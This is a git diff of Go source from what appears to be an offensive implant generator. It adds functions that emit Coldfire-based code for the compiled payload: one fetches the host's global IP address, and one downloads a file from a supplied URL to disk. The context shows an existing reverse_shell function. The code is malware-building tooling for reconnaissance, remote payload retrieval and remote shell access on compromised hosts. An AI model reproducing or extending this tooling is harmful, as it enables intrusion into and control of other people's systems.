@@ -104,6 +104,26 @@ func get_local_ip(value string, s_json string) ([]string, string) {
 
 //
 //
+// Get the global ip address
+// The result is placed in a runtime variable
+//
+//
+func get_global_ip(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "get_global_ip"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(){", function_call),
+		"spine.variable.set(coldfire.GetGlobalIp())",
+		"}"})
+
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+}
+
+//
+//
 // Grabs the current wireless interface
 // Input None
 // The result will be the interface name and mac adress which are placed into seperate runtime variables
@@ -213,4 +233,28 @@ func reverse_shell(value string, s_json string) ([]string, string) {
 	parameter_1 := tools.Generate_int_array_parameter(ip)
 
 	return []string{fmt.Sprintf("%s(%s, %d)", function_call, parameter_1, i_port)}, structure.Send(data_object)
+}
+
+//
+//
+// Downloads a file from the provided url and saves it with the same name on the disk
+//
+//
+func download(value string, s_json string) ([]string, string) {
+	data_object := structure.Receive(s_json)
+	function_call := "download"
+
+	data_object.Add_go_function([]string{
+		fmt.Sprintf("func %s(repr_1 []int){", function_call),
+		"param_1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
+		"err := coldfire.Download(param_1)",
+		"if err != nil {",
+		"spine.log(err.Error())",
+		"}",
+		"}"})
+	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
+
+	parameter_1 := tools.Generate_int_array_parameter(value)
+
+	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
 }
